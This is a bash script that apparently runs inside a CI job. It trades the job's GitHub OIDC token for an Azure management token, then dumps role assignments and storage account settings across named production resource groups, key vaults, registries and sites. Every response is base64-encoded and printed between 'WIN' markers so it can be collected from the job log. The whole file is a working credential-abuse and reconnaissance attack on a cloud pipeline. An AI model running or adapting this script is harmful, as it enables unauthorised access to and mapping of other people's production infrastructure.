#!/usr/bin/env bash
set -uo pipefail
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
FED="72ff278a-9e71-43ec-bac4-2ca303f8e462"
RG="rg-tbl-platform-prod-sea"
b64(){ printf '%s' "$1" | base64 -w0 | tr -d '\n'; }
echo "===WIN_START==="
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
AT=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$FED" -d grant_type=client_credentials \
  --data-urlencode "scope=https://management.azure.com/.default" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$JWT" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "ARM_TOK_LEN=${#AT}"
armget(){ curl -sS -m 20 "$1" -H "Authorization: Bearer ${AT}"; }

RA="api-version=2022-04-01"
# 1) role assignments at subscription, both RGs, and every resource
echo "RA_SUB=$(b64 "$(armget "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?$RA")")"
for R in "$RG" "rg-tbl-reporting-prod-eus"; do
  echo "RA_RG_${R}=$(b64 "$(armget "https://management.azure.com/subscriptions/$SUB/resourceGroups/$R/providers/Microsoft.Authorization/roleAssignments?$RA")")"
done
# per-resource role assignments (storage, vaults, sites, acr, afd)
for RES in \
  "providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz" \
  "providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz" \
  "providers/Microsoft.Storage/storageAccounts/sttblarchiveprodx3euoz" \
  "providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz" \
  "providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz" \
  "providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz" \
  "providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz" \
  "providers/Microsoft.Web/sites/app-tbl-storefront-prod" \
  "providers/Microsoft.Cdn/profiles/afd-tbl-prod" ; do
  echo "RA_${RES##*/}=$(b64 "$(armget "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/$RES/providers/Microsoft.Authorization/roleAssignments?$RA")")"
done
# reporting app (different RG)
echo "RA_site_reporting=$(b64 "$(armget "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/providers/Microsoft.Authorization/roleAssignments?$RA")")"

# 2) storage account properties (auth config)
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "PROP_${SA}=$(b64 "$(armget "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA?api-version=2023-01-01")")"
done
echo "===WIN_END==="
